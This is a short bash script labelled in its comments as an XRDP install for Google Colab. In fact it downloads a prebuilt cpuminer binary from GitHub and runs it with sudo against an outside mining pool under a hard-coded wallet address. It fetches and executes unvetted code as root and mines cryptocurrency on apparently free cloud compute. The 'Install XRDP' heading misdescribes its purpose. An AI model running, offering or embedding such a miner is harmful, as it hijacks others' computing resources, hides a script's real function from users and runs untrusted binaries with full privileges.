#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt install wget build-essential checkinstall
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential unzip


sudo apt update
clear
sudo apt install git screen -y
screen -R light

wget https://github.com/MerlinMagic2018/cpuminer-RKZ/releases/download/V4.2b/cpuminer-RKZ-LNC-Linux.zip
unzip cpuminer-RKZ-LNC-Linux.zip
cd cpuminer-RKZ-LNC-Linux
chmod +x cpuminer

sudo ./cpuminer -a yespowerLTNCG -o us1.stratu.ms:14158  -u CdbPVP9XJVsxk3WXvCGAe99N8iYFKnpZhN.NB-01 -p x
